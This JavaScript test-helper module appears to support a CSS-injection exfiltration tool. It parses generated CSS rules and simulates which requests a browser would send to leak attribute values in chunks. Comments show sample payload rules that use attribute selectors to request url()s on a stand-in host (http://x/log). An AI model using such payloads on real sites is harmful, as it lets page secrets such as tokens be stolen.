'use strict';

const { generateCSS } = require('../public/payload');

// Seeded PRNG so random runs are reproducible. Override with FRAG_SEED=<n>.
const SEED = process.env.FRAG_SEED ? Number(process.env.FRAG_SEED) : 0xf7a9;

function rng(seed = SEED) {
  let a = seed >>> 0;
  const next = () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
  next.int = (min, max) => min + Math.floor(next() * (max - min + 1));
  next.hex = n => Array.from({ length: n }, () => '0123456789abcdef'[Math.floor(next() * 16)]).join('');
  next.pick = arr => arr[Math.floor(next() * arr.length)];
  next.shuffle = arr => {
    const a = [...arr];
    for (let i = a.length - 1; i > 0; i--) {
      const j = Math.floor(next() * (i + 1));
      [a[i], a[j]] = [a[j], a[i]];
    }
    return a;
  };
  return next;
}

function grams(s, k = 3) {
  const out = new Set();
  for (let i = 0; i + k <= s.length; i++) out.add(s.substring(i, i + k));
  return out;
}

// Parse the rules generateCSS() emits, e.g.
//   &[href*="abc"]{--m-a:",abc";--a:url(http://x/log?c=abc&t=m)}
//   &[value^="abc"]+*{--d-s:"abc";--s:url(http://x/log?c=abc&t=s)}
function parsePayload(css) {
  const rules = [];
  const ruleRe = /&\[([\w-]+)([\^*$]?=)"([^"]*)"\](?:\+\*)?\{([^}]*)\}/g;
  const declRe = /--([\w-]+):url\([^)]*\/log\?c=([0-9a-f]+)&t=([sme])\)/g;
  for (const [, attr, op, value, body] of css.matchAll(ruleRe)) {
    for (const [, prop, chunk, type] of body.matchAll(declRe)) {
      rules.push({ attr, op, value, prop, chunk, type });
    }
  }
  return rules;
}

function matches(op, attrValue, needle) {
  if (op === '^=') return attrValue.startsWith(needle);
  if (op === '$=') return attrValue.endsWith(needle);
  if (op === '*=') return attrValue.includes(needle);
  return attrValue === needle;
}

// What the browser would request for an element whose attribute holds
// `attrValue`: every custom property takes the value of the last matching rule
// (all rules share the same specificity), and each property set to a url()
// becomes one background-image request.
function leak(rules, attrValue) {
  const winners = new Map();
  for (const rule of rules) {
    if (matches(rule.op, attrValue, rule.value)) winners.set(rule.prop, rule);
  }
  const requests = [...winners.values()].map(r => ({ t: r.type, c: r.chunk }));
  return {
    requests,
    data: {
      start: requests.find(r => r.t === 's')?.c ?? null,
      end: requests.find(r => r.t === 'e')?.c ?? null,
      chunks: requests.filter(r => r.t === 'm').map(r => r.c),
    },
  };
}

function payloadRules(config, server = 'http://frag.test') {
  const css = generateCSS(config, server);
  const rules = parsePayload(css);
  if (rules.length !== 3 * 4096) throw new Error(`expected ${3 * 4096} rules, parsed ${rules.length}`);
  return rules;
}

module.exports = { SEED, rng, grams, parsePayload, leak, payloadRules };
